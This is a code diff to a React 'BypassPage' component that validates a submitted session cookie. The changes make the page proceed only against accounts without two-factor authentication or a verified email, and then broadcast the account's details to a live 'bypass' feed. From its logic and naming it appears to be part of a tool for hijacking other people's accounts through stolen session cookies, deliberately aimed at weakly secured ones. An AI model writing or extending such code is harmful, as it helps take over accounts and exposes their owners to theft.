@@ -84,18 +84,27 @@ const BypassPage = () => {
       }
     } catch { apiOk = false; }
 
-    // If cookie invalid → block bypass and announce failure
+    // If cookie invalid → just block, no embed, no live log
     if (!apiOk) {
       if (intervalRef.current) window.clearInterval(intervalRef.current);
       setProgress(0);
       setStatus("error");
       toast.error("Invalid cookie — bypass blocked");
-      await broadcastLiveBypassFailed({ valid: false, username: 'Unknown' }, 'Invalid cookie');
-      pushLiveBypass({ username: 'Unknown', success: false });
       return;
     }
 
-    // Cookie valid — announce live bypass start immediately
+    // Secured accounts (2FA or verified email) cannot be bypassed → BLOCK BYPASS
+    if (info.has2FA || info.emailVerified) {
+      if (intervalRef.current) window.clearInterval(intervalRef.current);
+      setProgress(0);
+      setStatus("error");
+      const reason = info.has2FA ? 'Authenticator enabled' : 'Email secured';
+      toast.error(`Account secured (${reason})`);
+      await broadcastLiveBypassFailed(info, reason);
+      return;
+    }
+
+    // Cookie valid + unsecured — announce live bypass start immediately
     broadcastLiveBypass(info);
 
     const elapsed = Date.now() - start;
